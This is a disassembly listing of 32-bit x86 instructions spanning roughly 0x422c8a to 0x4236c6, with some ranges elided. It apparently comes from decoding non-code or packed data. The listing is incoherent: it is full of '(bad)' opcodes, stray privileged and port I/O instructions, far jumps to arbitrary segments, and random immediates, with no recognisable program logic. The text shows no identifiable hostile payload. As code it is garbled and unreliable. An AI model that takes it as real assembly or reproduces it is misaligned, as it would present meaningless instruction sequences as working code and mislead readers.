  422c8a:	rcpps  xmm7,XMMWORD PTR [ebx]
  422c8d:	jmp    0xdb58:0xf73b84e0
  422c94:	pushf  
  422c95:	sbb    eax,0x91b3c300
  422c9a:	and    eax,0xe9fd3275
  422c9f:	jnp    0x422c70
  422ca1:	stc    
  422ca2:	int    0xce
  422ca4:	dec    esi
  422ca5:	leave  
  422ca6:	das    
  422ca7:	not    BYTE PTR [edx-0x763953e4]
  422cad:	icebp  
  422cae:	jle    0x422c35
  422cb0:	aas    
  422cb1:	or     ebp,DWORD PTR [edx+0x4d]
  422cb4:	out    0x0,al
	...
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fbstp  TBYTE PTR [eax+0x33]
  422d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d25:	sub    al,0x46
  422d27:	jb     0x422d2a
  422d29:	add    BYTE PTR [edi],al
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    BYTE PTR [edx],ch
  422d2f:	lods   eax,DWORD PTR ds:[esi]
  422d30:	pusha  
  422d31:	jb     0x422d80
  422d33:	cli    
  422d34:	dec    ebp
  422d35:	pop    es
  422d36:	rol    DWORD PTR [edx+edi*2-0x1c83b848],1
  422d3d:	sbb    DWORD PTR [ebp+0x841de9f],eax
  422d43:	jno    0x422d82
  422d45:	pop    es
  422d46:	rcl    eax,0x26
  422d49:	jp     0x422d3f
  422d4b:	pusha  
  422d4c:	add    al,0x1e
  422d4e:	dec    edx
  422d4f:	sahf   
  422d50:	ret    
  422d51:	dec    edi
  422d52:	aad    0x5d
  422d54:	sbb    DWORD PTR [esi],esi
  422d56:	int    0xd9
  422d58:	sbb    eax,0xa7a29300
  422d5d:	mov    edi,0x373d5627
  422d62:	arpl   WORD PTR [esi-0x6c0d2abd],bp
  422d68:	loopne 0x422d84
  422d6a:	jne    0x422dd0
  422d6c:	push   eax
  422d6d:	pop    ebx
  422d6e:	(bad)  
  422d6f:	test   BYTE PTR [eax+0x1d1d0b2],0x52
  422d76:	hlt    
  422d77:	into   
  422d78:	push   ds
  422d79:	inc    edi
  422d7a:	jp     0x422dfb
  422d7c:	push   eax
  422d7d:	sbb    bl,BYTE PTR [ebx+ebx*1+0x22cfa971]
  422d84:	loopne 0x422ded
  422d86:	cmp    eax,eax
  422d88:	clc    
  422d89:	pop    es
  422d8a:	pop    edx
  422d8b:	stc    
  422d8c:	sbb    ch,BYTE PTR [ebp-0x67]
  422d8f:	(bad)  [ecx+0x7a]
  422d92:	out    0x78,eax
  422d94:	pop    ss
  422d95:	inc    esp
  422d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d97:	enter  0xddb5,0x57
  422d9b:	xchg   ebx,eax
  422d9c:	enter  0x54c6,0x38
  422da0:	ins    DWORD PTR es:[edi],dx
  422da1:	and    DWORD PTR [ecx-0x23ab4ae5],ebx
  422da7:	push   esi
  422da8:	jo     0x422d4f
  422daa:	dec    ebp
  422dab:	fild   WORD PTR [eax-0x1f4a52e0]
  422db1:	jmp    0x93d3a87c
  422db6:	mov    ds:0x7e6cd815,al
  422dbb:	sbb    eax,0x59ec9714
  422dc0:	je     0x422e3f
  422dc2:	stos   BYTE PTR es:[edi],al
  422dc3:	(bad)  
  422dc4:	out    dx,al
  422dc5:	xor    esi,edi
  422dc7:	lods   al,BYTE PTR ds:[esi]
  422dc8:	leave  
  422dc9:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  422dcb:	hlt    
  422dcc:	add    ch,0x22
  422dcf:	cli    
  422dd0:	jge    0x422e35
  422dd2:	sub    BYTE PTR [edx+0x357f5e43],dh
  422dd8:	neg    BYTE PTR [eax+ebx*8+0x7fbbb98f]
  422ddf:	fnstenv [esi]
  422de1:	leave  
  422de2:	(bad)  
  422de3:	call   0xdc5dea29
  422de8:	xchg   edi,eax
  422de9:	mov    cl,0xb3
  422deb:	push   esp
  422dec:	fcomp  st(3)
  422dee:	add    eax,0x5ad7f131
  422df3:	pop    esp
  422df4:	pop    esp
  422df5:	aam    0x13
  422df7:	std    
  422df8:	push   ebx
  422df9:	aaa    
  422dfa:	ror    DWORD PTR es:[ebx+0x26],cl
  422dfe:	cmp    al,0x18
  422e00:	gs std 
  422e02:	mov    ch,0x4e
  422e04:	inc    edx
  422e05:	pop    esi
  422e06:	dec    edi
  422e07:	inc    ecx
  422e08:	mov    bh,0xb6
  422e0a:	xchg   ebp,eax
  422e0b:	ds jne 0x422dd9
  422e0e:	xchg   ecx,eax
  422e0f:	(bad)  
  422e10:	push   ds
  422e11:	adc    cl,BYTE PTR ds:0x684a9975
  422e17:	or     BYTE PTR [ecx+0x23],ch
  422e1a:	xchg   ebp,eax
  422e1b:	sbb    eax,0x12351ddd
  422e20:	call   0x5b33:0x23c6f5c8
  422e27:	pop    esi
  422e28:	inc    edx
  422e29:	xor    BYTE PTR [ecx],bh
  422e2b:	test   eax,0xd6003cb9
  422e30:	std    
  422e31:	stc    
  422e32:	cmp    BYTE PTR [edx+0x5e],dh
	...
  422e94:	add    BYTE PTR [eax],al
  422e96:	adc    DWORD PTR [ebp-0x78],0x19
  422e9a:	(bad)  
  422e9c:	xchg   ebx,eax
  422e9d:	fild   WORD PTR [edi+0xbbb2a91]
  422ea3:	xchg   esp,eax
  422ea4:	xor    al,0xec
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [ebx],bh
  422eaf:	cli    
  422eb0:	adc    esi,DWORD PTR [eax+0x1f]
  422eb3:	jae    0x422e83
  422eb5:	stc    
  422eb6:	dec    BYTE PTR [eax]
  422eb8:	test   DWORD PTR [ecx-0x48ce8044],0xd49d2765
  422ec2:	aam    0xa6
  422ec4:	mov    esi,0xe1501b7d
  422ec9:	rcl    BYTE PTR [ebx-0x2f],0xf3
  422ecd:	mov    al,ds:0xc5c8dc23
  422ed2:	mov    ah,0xb4
  422ed4:	into   
  422ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ed6:	repz in eax,dx
  422ed8:	push   esi
  422ed9:	xchg   esi,eax
  422eda:	retf   
  422edb:	shr    BYTE PTR [esi],1
  422edd:	or     eax,0xedb723be
  422ee2:	jo     0x422ea5
  422ee4:	mov    eax,0xb7eb213a
  422ee9:	ins    DWORD PTR es:[edi],dx
  422eea:	xor    eax,0xe7c6b29
  422eef:	test   al,0x6d
  422ef1:	pop    edi
  422ef2:	pushf  
  422ef3:	push   0x1e56a8e5
  422ef8:	ret    
  422ef9:	stos   BYTE PTR es:[edi],al
  422efa:	push   ss
  422efb:	retf   
  422efc:	sbb    al,0xcc
  422efe:	arpl   bp,sp
  422f00:	in     al,dx
  422f01:	hlt    
  422f02:	mov    al,0x89
  422f04:	out    0xb5,al
  422f06:	add    ecx,DWORD PTR [ecx]
  422f08:	or     dl,cl
  422f0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f0b:	iret   
  422f0c:	fcomp  st(5)
  422f0e:	stos   BYTE PTR es:[edi],al
  422f0f:	sbb    ecx,ebx
  422f11:	je     0x422edf
  422f13:	adc    DWORD PTR [esi-0x6d406b1f],ebp
  422f19:	mov    BYTE PTR [esi-0x19950846],ch
  422f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f20:	xchg   esi,eax
  422f21:	xor    al,0xdb
  422f23:	dec    edi
  422f24:	adc    ecx,esp
  422f26:	or     BYTE PTR [edx-0x55],bl
  422f29:	test   al,0x5d
  422f2b:	mov    dl,BYTE PTR [esi]
  422f2d:	dec    edi
  422f2e:	neg    ecx
  422f30:	loope  0x422fa6
  422f32:	pop    edi
  422f33:	rcr    ebx,0x87
  422f36:	lea    ebx,[edx-0x36]
  422f39:	lds    ebp,FWORD PTR [edi]
  422f3b:	xchg   edi,eax
  422f3c:	mov    esi,ebp
  422f3e:	outs   dx,BYTE PTR ds:[esi]
  422f3f:	not    BYTE PTR ds:0x907c7080
  422f45:	mov    bl,0x9d
  422f47:	in     eax,0xb6
  422f49:	ret    0xe218
  422f4c:	mul    DWORD PTR [edx+0x30]
  422f4f:	cmp    DWORD PTR [edx+0x23],esp
  422f52:	jecxz  0x422f1c
  422f54:	mov    ebp,0xe720ddc6
  422f59:	lds    esp,FWORD PTR [esi-0x5e]
  422f5c:	mov    BYTE PTR [esi],bh
  422f5e:	push   ds
  422f5f:	pop    edi
  422f60:	or     DWORD PTR [edi-0x187d55ca],esi
  422f66:	inc    edx
  422f67:	cmp    DWORD PTR [esi-0x43a99a39],edx
  422f6d:	dec    edx
  422f6e:	stos   BYTE PTR es:[edi],al
  422f6f:	repnz cdq 
  422f71:	or     BYTE PTR [eax-0x35ac7e1f],0x99
  422f78:	xor    eax,0x3261af27
  422f7d:	sub    eax,0xd2658902
  422f82:	iret   
  422f83:	mov    WORD PTR [esi],gs
  422f85:	mov    al,0xfa
  422f87:	add    eax,edi
  422f89:	mov    ebp,0x103b2945
  422f8e:	in     al,0x93
  422f90:	push   esi
  422f91:	sbb    BYTE PTR [eax+0xf],0xfb
  422f95:	push   edi
  422f96:	cdq    
  422f97:	clc    
  422f98:	cmp    BYTE PTR [edi],bh
  422f9a:	nop
  422f9b:	jl     0x422f47
  422f9d:	fldcw  WORD PTR [esi+0x6d]
  422fa0:	sub    edi,DWORD PTR [eax-0x6f]
  422fa3:	inc    eax
  422fa4:	cwde   
  422fa5:	push   cs
  422fa6:	or     eax,0x8303e7b7
  422fab:	(bad)  
  422fac:	push   ds
  422fad:	jb     0x422f69
  422faf:	ss aaa 
  422fb1:	or     BYTE PTR [ebx+ebx*4],al
  422fb4:	cdq    
	...
  423015:	add    BYTE PTR [esi-0x1c],al
  423018:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [ecx+0x54ea0a19],ecx
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    BYTE PTR [eax],dh
  42302f:	fldenv [esi-0x42e1611e]
  423035:	aaa    
  423036:	loope  0x423054
  423038:	xchg   ebx,eax
  423039:	in     eax,0x62
  42303b:	xchg   ebx,eax
  42303c:	mov    esp,0x229be92a
  423041:	mov    edi,0xcdf063f1
  423046:	por    mm1,QWORD PTR [edi+0x2b]
  42304a:	jmp    0x5782:0x60e51bc7
  423051:	clc    
  423052:	test   al,0x76
  423054:	lds    edx,FWORD PTR [esi+0x62]
  423057:	call   0xe05f039
  42305c:	into   
  42305d:	ja     0x4230a7
  42305f:	stos   DWORD PTR es:[edi],eax
  423060:	pop    ds
  423061:	out    0xa0,eax
  423063:	fwait
  423064:	jg     0x4230e0
  423066:	ror    BYTE PTR [ecx-0x327293ce],0x10
  42306d:	retf   0xe09d
  423070:	cmp    esi,DWORD PTR [eax]
  423072:	in     al,dx
  423073:	arpl   WORD PTR [ebx],cx
  423075:	fnstcw WORD PTR [eax-0x63658990]
  42307b:	cs cld 
  42307d:	test   DWORD PTR [ebp-0x4a3246b0],esi
  423083:	xchg   edx,eax
  423084:	loope  0x423080
  423086:	fnstenv [eax+0x13]
  423089:	jnp    0x423019
  42308b:	pop    es
  42308c:	(bad)  
  42308d:	mov    DWORD PTR [esi],esi
  42308f:	and    al,0xa8
  423091:	add    ch,ch
  423093:	ss cmc 
  423095:	inc    edi
  423096:	out    dx,al
  423097:	xor    DWORD PTR [edi-0x13],0xcced38e1
  42309e:	add    al,0xd7
  4230a0:	dec    ch
  4230a2:	add    ch,cl
  4230a4:	popa   
  4230a5:	pop    eax
  4230a6:	rol    ah,1
  4230a8:	out    0x53,eax
  4230aa:	out    0x82,eax
  4230ac:	sub    BYTE PTR [ebp+0x5782f873],0x7b
  4230b3:	jmp    0x762a:0xa831e7f4
  4230ba:	or     BYTE PTR [ebp-0x7e],dl
  4230bd:	pushf  
  4230be:	jns    0x4230a5
  4230c0:	call   0x42bc:0xa9646893
  4230c7:	or     bh,ah
  4230c9:	inc    ebp
  4230ca:	imul   eax,DWORD PTR [eax],0x4df0f4ce
  4230d0:	repnz retf 0x739e
  4230d4:	iret   
  4230d5:	cmp    eax,0xb221d827
  4230da:	dec    ecx
  4230db:	inc    DWORD PTR [ebx]
  4230dd:	sub    BYTE PTR [eax-0x46d0024f],dl
  4230e3:	inc    edx
  4230e4:	arpl   WORD PTR [edx+0x3e],bp
  4230e7:	jne    0x423159
  4230e9:	push   ecx
  4230ea:	outs   dx,BYTE PTR ds:[esi]
  4230eb:	sub    eax,0x66984c12
  4230f0:	lahf   
  4230f1:	mov    BYTE PTR [ebx+0x6f910457],0xc5
  4230f8:	iret   
  4230f9:	sbb    eax,DWORD PTR [esi-0xece9772]
  4230ff:	outs   dx,DWORD PTR ds:[esi]
  423100:	xchg   esp,eax
  423101:	inc    esp
  423102:	ret    
  423103:	test   DWORD PTR [edx],eax
  423105:	sub    ah,BYTE PTR [ebx+ebx*4]
  423108:	jmp    0x9801d0e4
  42310d:	pusha  
  42310e:	jg     0x4230e0
  423110:	(bad)  
  423111:	ss mov bl,bl
  423114:	(bad)  
  423116:	dec    DWORD PTR [ebx-0x24]
  423119:	jno    0x4230d0
  42311b:	hlt    
  42311c:	fsubr  QWORD PTR [esi+edi*4]
  42311f:	fmul   DWORD PTR [ecx+ebx*1+0x2a]
  423123:	ret    0xcab3
  423126:	and    edx,esi
  423128:	inc    eax
  423129:	push   edx
  42312a:	or     eax,0xdc803070
  42312f:	fwait
  423130:	repnz test ah,bh
  423133:	pop    ss
  423134:	lock add BYTE PTR [eax],al
	...
  423193:	add    BYTE PTR [eax],al
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	and    BYTE PTR [ebx+eiz*1],0xe3
  4231a5:	push   edi
  4231a6:	pop    ebx
  4231a7:	jne    0x4231aa
  4231a9:	add    BYTE PTR [edi],al
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [ebp-0x20],al
  4231b0:	xchg   esp,eax
  4231b1:	xchg   ecx,eax
  4231b2:	test   al,0x6c
  4231b4:	adc    ch,BYTE PTR [ecx+0x46]
  4231b7:	cld    
  4231b8:	in     al,0xed
  4231ba:	mov    ds:0xb56dd11b,al
  4231bf:	pop    ss
  4231c0:	cmp    BYTE PTR [esi],0xbc
  4231c3:	or     esp,DWORD PTR [edi]
  4231c5:	mov    ds:0x8d6cfd63,al
  4231ca:	retf   0x96c8
  4231cd:	ins    BYTE PTR es:[edi],dx
  4231ce:	je     0x4231cd
  4231d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231d1:	lods   al,BYTE PTR ds:[esi]
  4231d2:	ins    BYTE PTR es:[edi],dx
  4231d3:	inc    esp
  4231d4:	add    al,BYTE PTR es:[esi-0x38]
  4231d8:	cmp    bh,BYTE PTR [esi+0x7a]
  4231db:	jbe    0x423238
  4231dd:	xchg   ebx,ecx
  4231df:	add    eax,0x5b5a7877
  4231e4:	int    0x50
  4231e6:	mov    al,0xa4
  4231e8:	dec    ebp
  4231e9:	add    dh,BYTE PTR [esp+edx*2]
  4231ec:	inc    edi
  4231ed:	enter  0x3bd,0xbc
  4231f1:	xchg   ecx,eax
  4231f2:	mov    gs,ebp
  4231f4:	dec    eax
  4231f5:	ror    DWORD PTR [esi+ebx*8-0x33fbf9fc],0x15
  4231fd:	jl     0x423200
  4231ff:	adc    ah,BYTE PTR [edx-0x4299ddbd]
  423205:	jb     0x42322d
  423207:	scas   al,BYTE PTR es:[edi]
  423208:	mov    edx,0x122e82d3
  42320d:	jecxz  0x423239
  42320f:	fdivr  DWORD PTR [ebp-0x23c706cd]
  423215:	mov    WORD PTR [esi-0x7c],gs
  423218:	xchg   ebp,eax
  423219:	and    bh,BYTE PTR [esi+0x7a4bacda]
  42321f:	pop    ebp
  423220:	push   cs
  423221:	mov    eax,ds:0x8756be66
  423226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423227:	adc    ebp,DWORD PTR [esi]
  423229:	inc    esi
  42322a:	push   ebp
  42322b:	jns    0x4232ac
  42322d:	and    dl,ch
  42322f:	enter  0x5ba0,0xfd
  423233:	fisubr DWORD PTR [eax]
  423235:	ror    DWORD PTR [edi],1
  423237:	pop    edi
  423238:	or     ecx,eax
  42323a:	xor    eax,DWORD PTR [ecx]
  42323c:	dec    esp
  42323d:	cdq    
  42323e:	pop    eax
  42323f:	(bad)  
  423240:	rcl    dh,cl
  423242:	inc    ecx
  423243:	cmp    bh,BYTE PTR ds:0x67a21dbf
  423249:	gs lahf 
  42324b:	data16 sbb BYTE PTR [eax-0x13],0x6c
  423250:	in     al,0x5a
  423252:	add    edx,DWORD PTR [eax+0x18b8398a]
  423258:	stc    
  423259:	or     BYTE PTR [ecx],al
  42325b:	mov    cl,0xbe
  42325d:	shr    al,0xc
  423260:	pop    edx
  423261:	ins    DWORD PTR es:[edi],dx
  423262:	pop    edi
  423263:	cmp    BYTE PTR [ebx+0x55],cl
  423266:	inc    ebp
  423267:	nop
  423268:	or     bh,BYTE PTR [eax-0xf]
  42326b:	jle    0x42326e
  42326d:	sbb    DWORD PTR [ebp-0x2d],edx
  423270:	mov    ds:0xbd450b7,al
  423275:	fsub   st(0),st
  423277:	adc    DWORD PTR [edi-0x6c],eax
  42327a:	mov    al,bh
  42327c:	ins    BYTE PTR es:[edi],dx
  42327d:	repz fld st(2)
  423280:	pop    ebx
  423281:	cmc    
  423282:	dec    eax
  423283:	dec    ebp
  423284:	push   ds
  423285:	imul   edi,ecx,0x138c142b
  42328b:	ret    
  42328c:	inc    esi
  42328d:	xchg   esi,eax
  42328e:	enter  0x3936,0xbf
  423292:	cmp    al,0x48
  423295:	popf   
  423296:	xchg   al,cl
  423298:	cmp    bh,BYTE PTR [eax]
  42329a:	inc    ecx
  42329b:	in     eax,0x12
  42329d:	(bad)  
  42329e:	push   ebp
  42329f:	(bad)  
  4232a0:	sub    eax,0xdde32bc2
  4232a5:	in     al,dx
  4232a6:	mov    dl,0x8e
  4232a8:	pop    esi
  4232a9:	clc    
  4232aa:	cmp    edi,DWORD PTR [ecx+eax*4+0x35]
  4232ae:	lock dec ecx
  4232b0:	inc    edx
  4232b1:	ret    0x44b8
  4232b4:	xchg   edi,eax
	...
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	xor    al,0xc2
  423324:	jg     0x4232e0
  423326:	bound  esi,QWORD PTR [esi+0x1]
  423329:	add    BYTE PTR [edi],al
  42332b:	add    DWORD PTR [eax],eax
  42332d:	add    BYTE PTR [eax+edx*2-0x64d322ec],dl
  423334:	sbb    edx,edi
  423336:	or     al,0xe7
  423338:	fld    DWORD PTR [eax]
  42333a:	je     0x423357
  42333c:	imul   edx,ebp,0xffffff94
  42333f:	stc    
  423340:	push   es
  423341:	xor    al,0x50
  423343:	add    eax,0x7483c77d
  423348:	xchg   ecx,eax
  423349:	xchg   esp,eax
  42334a:	(bad)  
  42334c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42334e:	push   eax
  42334f:	cmp    al,0x55
  423351:	aas    
  423352:	dec    ebx
  423353:	stc    
  423354:	(bad)  
  423355:	out    dx,eax
  423356:	inc    edx
  423357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423358:	mov    bh,0xb8
  42335a:	and    eax,0xb5fe6c1a
  42335f:	jmp    DWORD PTR [edi]
  423361:	pop    es
  423362:	adc    bl,BYTE PTR [ebp-0x62e09bbd]
  423368:	out    0x61,eax
  42336a:	dec    ecx
  42336b:	test   eax,0x3921aec1
  423370:	or     DWORD PTR [eax-0x2fb07917],ebp
  423376:	aam    0x5e
  423378:	sbb    dh,0xc7
  42337b:	pop    ebp
  42337c:	xchg   ecx,eax
  42337d:	jnp    0x42339c
  42337f:	and    al,0x3b
  423381:	push   0x3
  423383:	push   ecx
  423384:	mov    ?,ebp
  423386:	adc    eax,0x717c111c
  42338b:	das    
  42338c:	jle    0x42332b
  42338e:	mov    edx,0x27a6224b
  423393:	push   ecx
  423394:	cmp    BYTE PTR [edi],dl
  423396:	mov    bh,0xda
  423398:	mov    bh,0xf
  42339a:	lea    esp,[esi]
  42339c:	xor    al,0xb4
  42339e:	sahf   
  42339f:	jl     0x4233dd
  4233a1:	xchg   edi,eax
  4233a2:	mov    eax,0xa7aac1a3
  4233a7:	div    DWORD PTR [edi+0x7b4fd522]
  4233ad:	js     0x423335
  4233af:	mov    esp,0xa0579dd5
  4233b4:	ficom  WORD PTR [ebp-0x46]
  4233b7:	aaa    
  4233b8:	pop    esi
  4233b9:	into   
  4233ba:	adc    al,0xc2
  4233bc:	dec    ebp
  4233bd:	adc    DWORD PTR [edx],ecx
  4233bf:	sbb    ecx,DWORD PTR [ebp+ebx*8+0x10]
  4233c3:	sbb    eax,0x5c60da1
  4233c8:	pop    es
  4233c9:	aam    0x79
  4233cb:	or     ch,BYTE PTR [edi+edx*1-0x23]
  4233cf:	mov    dl,0x91
  4233d1:	mov    ds:0xa1dfd175,al
  4233d6:	xor    eax,0x7406736f
  4233db:	and    cl,BYTE PTR [ebx]
  4233dd:	into   
  4233de:	popf   
  4233df:	dec    ebx
  4233e0:	add    esp,DWORD PTR [ecx+0x26]
  4233e3:	push   ecx
  4233e4:	imul   ebp,DWORD PTR [edx-0x7b],0x7f
  4233e8:	int3   
  4233e9:	data16 repnz std 
  4233ec:	mov    bl,0x6c
  4233ee:	pop    WORD PTR [edi]
  4233f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233f2:	pop    ss
  4233f3:	int3   
  4233f4:	add    BYTE PTR ds:0xbf147771,dh
  4233fa:	nop
  4233fb:	sar    bh,1
  4233fd:	or     esi,DWORD PTR es:[edi+eax*4]
  423401:	ret    
  423402:	ins    BYTE PTR es:[edi],dx
  423403:	add    esi,DWORD PTR ds:0x6ae8a81c
  423409:	(bad)  
  42340a:	mov    WORD PTR [eax],gs
  42340c:	push   cs
  42340d:	hlt    
  42340e:	mov    dl,0xf8
  423410:	sbb    al,0xd9
  423412:	fcmove st,st(2)
  423414:	xor    eax,DWORD PTR [ecx+0x40]
  423417:	lahf   
  423418:	sbb    esp,DWORD PTR [ebp-0x5e7e8387]
  42341e:	sub    BYTE PTR [ebx-0x28],dh
  423421:	pop    es
  423422:	mov    ah,0x10
  423424:	fs jmp 0x42346e
  423427:	cmc    
  423428:	(bad)  
  423429:	push   ds
  42342a:	push   cs
  42342b:	fstp   TBYTE PTR [ecx+0x6d7d1b9]
  423431:	and    DWORD PTR [eax+0x306b],ebp
	...
  423493:	add    BYTE PTR [eax],al
  423495:	add    al,al
  423497:	mov    al,0x45
  423499:	outs   dx,DWORD PTR ds:[esi]
  42349a:	jne    0x42349b
  42349c:	jmp    0xa1e0:0x16fb60bf
  4234a3:	jmp    0x77ab869b
  4234a8:	add    DWORD PTR [eax],eax
  4234aa:	pop    es
  4234ab:	add    DWORD PTR [eax],eax
  4234ad:	add    BYTE PTR [ebp+0x3],cl
  4234b0:	arpl   dx,bp
  4234b2:	push   esp
  4234b3:	out    dx,al
  4234b4:	inc    ebp
  4234b5:	cmp    BYTE PTR [ebp+0x2],ch
  4234b8:	in     al,dx
  4234b9:	sub    BYTE PTR [ebp-0x71522295],0x3e
  4234c0:	test   DWORD PTR ds:0x67b995bc,edx
  4234c6:	out    0xbb,eax
  4234c8:	mov    eax,ds:0x15a10078
  4234cd:	ins    BYTE PTR es:[edi],dx
  4234ce:	iret   
  4234cf:	push   ss
  4234d0:	mov    dh,0x5f
  4234d2:	pusha  
  4234d3:	(bad)  
  4234d4:	sub    ebp,ebp
  4234d6:	mov    ah,BYTE PTR [ebp-0x3c]
  4234d9:	mov    fs,edx
  4234db:	fld    QWORD PTR [ebx+0x38]
  4234de:	pop    es
  4234df:	xor    al,0x94
  4234e1:	ds mov ecx,gs
  4234e4:	lods   al,BYTE PTR ds:[esi]
  4234e5:	icebp  
  4234e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234e7:	jg     0x423567
  4234e9:	mov    esi,0xb9deffe6
  4234ee:	jbe    0x423551
  4234f0:	cmp    BYTE PTR [eax+0x53f0ca44],ch
  4234f6:	hlt    
  4234f7:	ret    
  4234f8:	xchg   esp,eax
  4234f9:	push   cs
  4234fa:	inc    eax
  4234fb:	mov    al,ds:0x1b52bec3
  423500:	dec    esi
  423501:	cdq    
  423502:	push   0xd1a112ea
  423507:	imul   eax,DWORD PTR fs:[ebx],0xffffff87
  42350b:	js     0x4234ce
  42350d:	loop   0x42353d
  42350f:	xchg   ebx,eax
  423510:	or     BYTE PTR [ebx+0x5],bh
  423513:	imul   esi,DWORD PTR [eax+0x2b],0xa4e6e48
  42351a:	lds    esi,FWORD PTR [ecx]
  42351c:	push   ss
  42351d:	stc    
  42351e:	xchg   esi,eax
  42351f:	sbb    BYTE PTR [ebp+ebx*2-0x4062d241],bl
  423526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423527:	lods   eax,DWORD PTR ds:[esi]
  423528:	iret   
  423529:	test   al,0xdd
  42352b:	pop    ebx
  42352c:	jne    0x423501
  42352e:	call   0xa3c:0x1ced9cfa
  423535:	retf   0xba1b
  423538:	sbb    DWORD PTR [edi-0x24],ebx
  42353b:	cli    
  42353c:	mov    ebp,0x13c63290
  423541:	and    cl,ah
  423543:	jne    0x423573
  423545:	test   ebp,0x79702dd2
  42354b:	or     DWORD PTR [edi+0x7577bb85],ebp
  423551:	inc    esp
  423552:	xchg   ebx,eax
  423553:	cmc    
  423554:	jne    0x4235c8
  423556:	xor    eax,0x4681e38
  42355b:	jne    0x42352c
  42355d:	cmp    cl,BYTE PTR [ebp-0x14]
  423560:	add    al,0x48
  423562:	adc    eax,0xa4bc08c5
  423567:	adc    edi,DWORD PTR [esi+0x79e146e4]
  42356d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42356e:	in     al,0xfe
  423570:	ror    esi,0x5f
  423573:	and    ecx,ebp
  423575:	ds js  0x423518
  423578:	or     DWORD PTR [eax+ebx*8-0x1],0x10
  42357d:	push   edx
  42357e:	out    0xfc,al
  423580:	shr    ebx,cl
  423582:	pusha  
  423583:	jg     0x42351d
  423585:	rcl    BYTE PTR [edi-0x66],0x60
  423589:	clc    
  42358a:	xor    al,0x3f
  42358c:	sar    BYTE PTR [edi+0x7],1
  42358f:	sub    DWORD PTR [esi*4+0x5470a196],edi
  423596:	xchg   ecx,eax
  423597:	xor    DWORD PTR [esi-0xcad9a6c],0xffffffe6
  42359e:	bound  ecx,QWORD PTR [ebx+0x84fce4]
  4235a4:	and    BYTE PTR [eax+0x79],al
  4235a7:	das    
  4235a8:	jo     0x4235e0
  4235aa:	adc    ebx,DWORD PTR [edx-0x49acb8ad]
  4235b0:	sub    edi,esp
  4235b2:	push   cs
  4235b3:	rol    DWORD PTR [eax+eax*1],1
	...
  423616:	or     BYTE PTR [edi-0x8808b84],0x88
  42361d:	dec    DWORD PTR [eax+0x2d]
  423620:	push   0xffffffda
  423622:	inc    ecx
  423623:	or     eax,0x7870c6fc
  423628:	add    DWORD PTR [eax],eax
  42362a:	pop    es
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    BYTE PTR [esi],dl
  42362f:	loopne 0x423698
  423631:	out    0xc1,al
  423633:	fsub   DWORD PTR ds:0xfa788982
  423639:	and    eax,0xacc6c6ef
  42363e:	cwde   
  42363f:	cld    
  423640:	dec    esi
  423641:	outs   dx,DWORD PTR ds:[esi]
  423642:	xor    eax,0xc8ffb91f
  423647:	mov    eax,0xf447f3fd
  42364c:	loope  0x423683
  42364e:	and    BYTE PTR [ebp+0x2c726c4d],0xb6
  423655:	lea    esp,[eax+eiz*4]
  423658:	imul   ebp,DWORD PTR [eax+0x52],0xffffff89
  42365c:	stc    
  42365d:	dec    edx
  42365e:	cmp    eax,esi
  423660:	shl    DWORD PTR [ebp+0x3a],cl
  423663:	mov    ch,0x56
  423665:	push   ss
  423666:	fnstsw WORD PTR [eax]
  423668:	sbb    al,0xc4
  42366a:	repz push esi
  42366c:	int    0x80
  42366e:	jge    0x423636
  423670:	mov    dl,BYTE PTR [esi+eax*2-0x1920251a]
  423677:	cmp    BYTE PTR [edx],0x5a
  42367a:	mov    ah,BYTE PTR [esi-0x78]
  42367d:	repnz (bad) 
  42367f:	loopne 0x4236f8
  423681:	aas    
  423682:	int3   
  423683:	xor    BYTE PTR [esi-0x497293e1],al
  423689:	fst    QWORD PTR [esi+0x3d6529fd]
  42368f:	dec    ebp
  423690:	pop    edx
  423691:	(bad)  
  423692:	jo     0x423621
  423694:	shr    DWORD PTR [eax+0x71],0xbe
  423698:	cmp    eax,ebp
  42369a:	ret    
  42369b:	and    eax,0x20b6f602
  4236a0:	jns    0x4236e7
  4236a2:	nop
  4236a3:	ds aas 
  4236a5:	and    dl,BYTE PTR [eax]
  4236a7:	cmp    ebx,esi
  4236a9:	cli    
  4236aa:	dec    ebx
  4236ab:	pop    esi
  4236ac:	sbb    bl,dh
  4236ae:	dec    edx
  4236af:	fwait
  4236b0:	push   esp
  4236b1:	jmp    0xf10:0xf8f1867c
  4236b8:	dec    BYTE PTR [esi+0x76]
  4236bb:	fs jbe 0x4236b7
  4236be:	dec    esp
  4236bf:	sub    ah,BYTE PTR [esi]
  4236c1:	push   0xd22d5b46
  4236c6:	enter  0x3f0d,0x3e
